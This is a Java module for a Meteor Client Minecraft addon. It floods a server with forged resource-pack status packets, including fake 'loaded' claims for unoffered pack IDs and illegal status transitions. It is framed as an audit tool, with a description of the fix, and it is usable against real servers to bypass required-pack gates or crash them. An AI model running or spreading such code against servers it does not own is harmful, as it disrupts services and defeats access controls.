package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.common.ResourcePackStatusC2SPacket;

import java.util.UUID;

/**
 * AUDIT: Resource-Pack Status Desync
 *
 * Sends ResourcePackStatusC2SPacket reporting pack-handling statuses
 * (ACCEPTED / DOWNLOADED / SUCCESSFULLY_LOADED / DECLINED / FAILED_DOWNLOAD …)
 * for pack UUIDs the server never offered, and in contradictory orders
 * (e.g. SUCCESSFULLY_LOADED for a pack that was never ACCEPTED). The
 * resource-pack handshake is a small state machine the server tracks per
 * offered pack; a client that lies about it — or replies about a pack that
 * doesn't exist — tests whether the server validates the pack id and enforces
 * legal status transitions.
 *
 * This matters on servers that gate joining behind "must accept resource pack":
 * a forged SUCCESSFULLY_LOADED could bypass the gate, and a status for an
 * unknown UUID could trip a NullPointer in a handler that assumes the pack is
 * in its pending map.
 *
 * What a vulnerable server does: accepts any status for any UUID and advances
 * its gate / dereferences a pending entry that isn't there.
 * What a hardened server does: ignores statuses for unoffered pack ids and
 * enforces the legal transition order before acting on the gate.
 * Fix: validate the pack UUID against the set actually offered to this player;
 * enforce the status state machine; never key required-pack logic off a single
 * client-claimed terminal status.
 *
 * Run against your OWN local server only.
 */
public class ResourcePackDesync extends Module {
    public enum Mode { FORGE_LOADED, CONTRADICTORY, ALL_STATUSES }

    private static final ResourcePackStatusC2SPacket.Status[] STATUSES =
        ResourcePackStatusC2SPacket.Status.values();

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("FORGE_LOADED = claim SUCCESSFULLY_LOADED for unknown packs; CONTRADICTORY = illegal transitions; ALL_STATUSES = cycle every status.")
        .defaultValue(Mode.CONTRADICTORY).build()
    );
    private final Setting<Boolean> unknownId = sgGeneral.add(new BoolSetting.Builder()
        .name("unknown-pack-id").description("Use random UUIDs the server never offered (vs. the zero UUID).")
        .defaultValue(true).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Status packets per tick.")
        .defaultValue(20).range(1, 500).sliderRange(1, 200).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int statusIdx = 0;

    public ResourcePackDesync() {
        super(AddonTemplate.CRASH_CATEGORY, "resource-pack-desync",
            "Sends resource-pack statuses for unoffered packs / in illegal order. Tests pack-id validation + handshake state machine.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; statusIdx = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    private UUID id() { return unknownId.get() ? UUID.randomUUID() : new UUID(0L, 0L); }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        for (int i = 0; i < perTick.get(); i++) {
            switch (mode.get()) {
                case FORGE_LOADED ->
                    send(ResourcePackStatusC2SPacket.Status.SUCCESSFULLY_LOADED);
                case CONTRADICTORY -> {
                    // claim success, then immediately claim it failed/declined for the same id
                    UUID u = id();
                    sendFor(u, ResourcePackStatusC2SPacket.Status.SUCCESSFULLY_LOADED);
                    sendFor(u, ResourcePackStatusC2SPacket.Status.DECLINED);
                    sendFor(u, ResourcePackStatusC2SPacket.Status.FAILED_DOWNLOAD);
                }
                case ALL_STATUSES -> {
                    send(STATUSES[statusIdx % STATUSES.length]);
                    statusIdx++;
                }
            }
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    private void send(ResourcePackStatusC2SPacket.Status status) { sendFor(id(), status); }

    private void sendFor(UUID u, ResourcePackStatusC2SPacket.Status status) {
        mc.player.networkHandler.sendPacket(new ResourcePackStatusC2SPacket(u, status));
        packetsSent++;
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
